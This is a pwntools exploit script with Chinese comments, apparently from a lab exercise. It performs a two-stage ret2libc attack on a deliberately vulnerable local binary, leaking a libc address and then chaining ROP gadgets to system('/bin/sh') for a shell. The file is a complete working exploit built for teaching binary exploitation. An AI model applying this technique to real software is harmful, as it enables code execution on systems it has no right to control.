#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""02-ret2libc · exp_ret2libc.py

两段式利用：
  stage1  puts(puts@got) 把 libc 里 puts 的真实地址打到屏幕 → 反推 libc 基址 → 返回 vuln 等第二次输入
  stage2  ret(栈对齐) + pop rdi; "/bin/sh" + system  →  shell

用法：
  python3 exp_ret2libc.py        # 本地 process 模式
  python3 exp_ret2libc.py r      # 远程模式（另开终端先跑 python3 serve.py）

每一步地址的来历见 report.md，这里不重复。
"""
import sys
from pwn import *

context.binary = ELF("./vuln2")
context.log_level = "info"

# ---------- 二进制内固定地址（No-PIE，编译后即确定，无需泄露）----------
RET      = 0x40101a   # 裸 ret：把 rsp 修正为 16 字节对齐（≡8 mod 16）
POP_RDI  = 0x4011be   # pop rdi ; ret：设置 system/puts 的第一个参数
PUTS_PLT = 0x401084   # puts@plt
PUTS_GOT = 0x404000   # puts@got：程序已调用过 puts，此处已是 libc 真实地址
VULN     = 0x4011c3   # 回到 vuln，触发第二次 read

# ---------- libc 偏移（按 BuildID 反查，见 report.md §3.2）----------
LIBC_PUTS   = 0x87cc0
LIBC_SYSTEM = 0x58750
LIBC_BINSH  = 0x1cc42f

OFFSET = 72           # cyclic 实测：buf[64] + saved rbp(8) = 72 字节到返回地址


def stage1_leak(p):
    """puts@plt(puts@got) 泄露 libc 基址，然后返回 vuln 准备第二次输入"""
    payload = flat({
        OFFSET: [
            RET,        # 栈对齐：puts 入口 rsp 需 ≡ 8 (mod 16)
            POP_RDI,    # rdi = PUTS_GOT
            PUTS_GOT,
            PUTS_PLT,   # 调用 puts(PUTS_GOT)
            VULN,       # puts 返回后跳回 vuln
        ]
    })
    p.sendlineafter(b"input> ", payload)
    p.recvuntil(b"you said: ")
    p.recvline()                                   # 跳过 "you said: AAAA...\n"
    leak = u64(p.recv(6).ljust(8, b"\x00"))        # puts 输出 6 字节地址 + \n
    log.success("leaked puts@libc = %#x" % leak)
    return leak


def stage2_shell(p, libc_base):
    # 注意这里是两个 RET：第一次进 vuln 是 main 用 call 调的（入口 rsp≡8），
    # 而 stage1 里 puts 返回时是用 ret 跳回 vuln 的，入口对齐状态翻转（rsp≡0），
    # 于是 system 入口会变成 rsp≡0 —— movaps 直接 SIGSEGV。
    # 多垫一个 ret 把对齐翻回来，这就是 64 位 ret2libc 的栈对齐坑。
    payload = flat({
        OFFSET: [
            RET,                        # ① 补翻错的 8 字节
            RET,                        # ② 常规 16 字节对齐
            POP_RDI,                    # rdi = "/bin/sh"
            libc_base + LIBC_BINSH,
            libc_base + LIBC_SYSTEM,
        ]
    })
    p.sendlineafter(b"input> ", payload)
    p.sendline(b"id; echo ===RET2LIBC_SHELL_WORKS===")
    print(p.recvuntil(b"===RET2LIBC_SHELL_WORKS===", timeout=5).decode(errors="replace"))


def main():
    if len(sys.argv) > 1 and sys.argv[1].lower() in ("r", "remote", "remote-host"):
        p = remote("127.0.0.1", 9999)              # 远程模式
    else:
        p = process("./vuln2")                     # 本地模式

    leak = stage1_leak(p)
    libc_base = leak - LIBC_PUTS
    log.success("libc base       = %#x" % libc_base)
    log.success("system@libc     = %#x" % (libc_base + LIBC_SYSTEM))
    log.success('"/bin/sh"@libc  = %#x' % (libc_base + LIBC_BINSH))
    stage2_shell(p, libc_base)
    p.close()


if __name__ == "__main__":
    main()